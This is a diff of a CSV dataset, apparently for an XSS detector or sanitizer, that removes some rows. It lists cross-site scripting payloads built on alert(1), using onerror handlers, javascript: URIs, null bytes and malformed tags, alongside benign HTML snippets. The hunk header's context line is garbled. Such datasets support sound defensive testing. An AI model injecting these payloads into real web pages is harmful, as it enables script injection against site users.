@@ -71,25 +71,13 @@ fi_ne ca>sino koda?k und[ertake h}ook road-s ple-nty fi|le al_t a;pplicable k~im
 "`""'>img src=xxx:x \x0Aonerror=javascript:alert(1)>",0
 <scriptjavascript:alert(1)<\x00/script>,0
 "<img src=# onerror\x3D""javascript:alert(1)""",0
-video poster=javascript:javascript:alert(1)//,0
-"<video><source onerror=""javascript:javascript:alert(1)""",0
-"<video onerror=""javascript:javascript:alert(1)""<source>",0
-"<form<button formaction=""javascript:javascript:alert(1)"">X",0
 body oninput=javascript:alert(1)><input autofocus>,0
 frameset onload=javascript:alert(1)>,0
 "table background=""javascript:javascript:alert(1)"">",0
 "<!--<img src=""-->img src=x onerror=javascript:alert(1)//"">",0
-<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT,0
-"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""<PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",0
-<b <scriptalert(1)</script>0,0
-"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""</div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",0
-"<x '=""foo""><x foo='<img src=x onerror=javascript:alert(1)//'>",0
-"embed src=""javascript:alert(1)"">",0
-"<img src=""javascript:alert(1)""",0
 "image src=""javascript:alert(1)"">",0
 "<script src=""javascript:alert(1)""",0
 div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,0
-"<div id=d><x xmlns=""<iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",0
 "<img \x00src=x onerror=""alert(1)""",0
 <option>See our customer testimonials</option>,0
 <tr>Join our community forum</tr>,0
